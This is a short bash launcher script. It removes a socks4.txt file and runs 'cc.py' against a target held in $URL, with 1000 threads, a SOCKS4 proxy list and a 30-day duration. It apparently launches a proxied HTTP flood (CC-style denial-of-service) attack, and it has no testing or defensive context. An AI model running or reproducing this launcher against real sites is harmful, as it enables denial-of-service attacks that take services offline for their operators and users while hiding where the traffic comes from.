#!/bin/bash
cd ..
rm -rf socks4.txt
python3 cc.py -url $URL -m cc -v 4 -t 1000 -f $PROXYsocks4.txt -b 1 -s 2592000 $VERIFY